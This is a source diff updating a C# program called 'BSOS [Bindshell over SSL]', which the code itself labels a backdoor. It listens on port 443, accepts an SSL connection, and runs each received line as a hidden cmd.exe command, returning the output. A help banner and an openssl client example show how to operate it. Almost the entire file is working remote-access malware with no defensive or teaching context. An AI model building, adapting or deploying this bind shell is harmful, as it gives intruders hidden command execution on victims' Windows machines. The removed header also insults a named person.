@@ -1,9 +1,16 @@
-﻿/*
- * BSOS [Bindshell over SSL] ver 1.0
- * console application coded in C# (FW Net 3.5) IDE Visual Studio CE 2017
+/*
+ * BSOS [Bindshell over SSL] ver 3.0
+ * console application coded in C# (FW Net 3.5) IDE Visual Studio CE 2019
  * by Zinzloun 
- * fuck $alvini
+ * No more jokes
+ * 
+ * Client connection example ***************
+ * 
+ * openssl s_client -connect 192.168.1.5:443
+ * 
+ * 
  */
+
 
 
 using System;
@@ -15,6 +22,7 @@ using System.IO;
 using System.Net.Security;
 using System.Security.Cryptography.X509Certificates;
 using System.Security.Authentication;
+using System.Text;
 
 namespace BindSSLShell
 {
@@ -22,47 +30,54 @@ namespace BindSSLShell
     {
         static void Main(string[] args)
         {
-            Backdoor._bind(6666);
+            Backdoor._bind(443);
         }
     }
 
     public class Backdoor
     {
-        private TcpListener listener;               
-        private Socket mainSocket;                          
-        private int port;                          
-        private String name;                
-        private bool verbose;                       
-        private Process shell;                         
-        private StreamReader fromShell;
-        private StreamWriter toShell;
+
+        /// <config>
+        static string IP = "192.168.1.5";
+        static int PORT = 443;
+        /// </config>
+
+
+
+        private TcpListener listener;
+        private Socket mainSocket;
+        private int port;
+        private bool verbose;
+
         private StreamReader inStream;
         private StreamWriter outStream;
-        private Thread shellThread;                        
+
 
         //interface to use without initialize
         public static void _bind(Int32 port)
         {
             string name = IPAddress.Any.ToString();
             Backdoor bd = new Backdoor();
-            bd.startServer(name, port, true);
+            bd.startServer(PORT, IP, true); ;
         }
 
         //start the server
-        public void startServer(string ns, int porta, bool verb = false)
+        public void startServer(int porta, string localIP, bool verb)
         {
             try
             {
-                name = ns;
+
                 port = porta;
                 verbose = verb;
-
+                IPAddress ip = IPAddress.Parse(localIP);
 
                 if (verbose)
-                    Console.WriteLine("Listening on port " + port);
+                    Console.WriteLine("Listening on " + ip.ToString() + ":" + port);
+
+
 
                 //Create the ServerSocket
-                listener = new TcpListener(IPAddress.Any, port);
+                listener = new TcpListener(ip, port);
                 listener.Start();                                   //Stop and wait for a connection
                 mainSocket = listener.AcceptSocket();
 
@@ -70,13 +85,13 @@ namespace BindSSLShell
                     Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);
 
                 //load the certificate: leave the password empty, doesn't mind
-                X509Certificate2 serverCertificate = new X509Certificate2("server.pfx","");
-                               
+                X509Certificate2 serverCertificate = new X509Certificate2("server.pfx", "");
+
                 Stream sNS = new NetworkStream(mainSocket);
 
                 //we create the SSL stream, no client authentication is required, we support SSL3 and TLS
                 SslStream sslStream = new SslStream(sNS);
-                sslStream.AuthenticateAsServer(serverCertificate, clientCertificateRequired: false, enabledSslProtocols:SslProtocols.Default, checkCertificateRevocation: true);
+                sslStream.AuthenticateAsServer(serverCertificate, clientCertificateRequired: false, enabledSslProtocols: SslProtocols.Ssl3, checkCertificateRevocation: true);
 
                 if (verbose)
                     DisplayCertificateInformation(sslStream);
@@ -85,53 +100,20 @@ namespace BindSSLShell
                 outStream = new StreamWriter(sslStream);
                 outStream.AutoFlush = true;
 
-
-                shell = new Process();
-                shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                ProcessStartInfo p = new ProcessStartInfo("cmd");
-                p.WindowStyle = ProcessWindowStyle.Hidden;
-                p.CreateNoWindow = true;
-                p.UseShellExecute = false;
-                p.RedirectStandardError = true;
-                p.RedirectStandardInput = true;
-                p.RedirectStandardOutput = true;
-                shell.StartInfo = p;
-                shell.Start();
-                toShell = shell.StandardInput;
-                fromShell = shell.StandardOutput;
-                toShell.AutoFlush = true;
-                shellThread = new Thread(new ThreadStart(getShellInput));               //Start a thread to read output from the shell
-                shellThread.Start();
-                outStream.WriteLine("Welcome to " + name + " BindSSLShell. Fuck $alvini\n");       
-                outStream.WriteLine("Starting the shell...\n");
-                getInput();                                                            
-                dropConnection();                                 
+                outStream.WriteLine("Welcome to BindSSLShellv2 backdoor. Issue help to get help\n");
+                outStream.WriteLine("or issue any DOS command...\n");
+                getInput();
+                dropConnection();
 
             }
-            catch (Exception e) {
+            catch (Exception e)
+            {
                 Console.WriteLine(e.Message + ": " + e.StackTrace.ToString());
                 dropConnection();
 
             }
         }
-        //////////////////////////////////////////////////////////////////////////////////////////////
-        //The run method handles shell output in a seperate thread
-        //////////////////////////////////////////////////////////////////////////////////////////////
 
-        void getShellInput()
-        {
-            try
-            {
-                String tempBuf = "";
-                outStream.WriteLine("\r\n");
-                while ((tempBuf = fromShell.ReadLine()) != null)
-                {
-                    outStream.WriteLine(tempBuf + "\r");
-                }
-                dropConnection();
-            }
-            catch (Exception) { dropConnection(); }
-        }
 
         private void getInput()
         {
@@ -154,12 +136,45 @@ namespace BindSSLShell
             {                                       //to the shell, so we could write our own if we want
                 if (com.Equals("exit"))
                 {                //In this case I catch the 'exit' command and use it
-                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
+                    outStream.WriteLine("\n\nDropping the connection...");
                     dropConnection();                   //to drop the connection
                 }
-                toShell.WriteLine(com + "\r\n");
+                else if (com.Equals("help"))
+                {
+                    outStream.WriteLine("You can issue DOS command, e.g. sc query type=service");
+                    outStream.WriteLine("|_ commands inside double quote are processed as well, e.g. \"whoami && hostname\"");
+                    outStream.WriteLine("|_ issue exit to close the session");
+                }
+                else
+                {
+                    string resCmd = Exec_cmd(com);
+                    outStream.WriteLine(resCmd);
+                }
             }
             catch (Exception) { dropConnection(); }
+        }
+
+        private string Exec_cmd(string cmd)
+        {
+
+            var processInfo = new ProcessStartInfo("cmd.exe", "/c " + cmd)
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardOutput = true
+            };
+
+            StringBuilder sb = new StringBuilder();
+            Process p = Process.Start(processInfo);
+            p.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
+            p.BeginOutputReadLine();
+            p.WaitForExit();
+            p.Close();
+            p.Dispose();
+            return sb.ToString();
+
+
         }
 
 
@@ -169,15 +184,10 @@ namespace BindSSLShell
             {
                 if (verbose)
                     Console.WriteLine("Dropping Connection");
-                shell.Close();
-                shell.Dispose();
-                shellThread.Abort();
-                shellThread = null;
+
                 inStream.Dispose();                                 //Close everything...
                 outStream.Dispose();
-                toShell.Dispose();
-                fromShell.Dispose();
-                shell.Dispose();
+
                 mainSocket.Close();
                 listener.Stop();
                 return;
@@ -201,7 +211,7 @@ namespace BindSSLShell
             {
                 Console.WriteLine("Local certificate is null.");
             }
-            
+
         }
 
     }
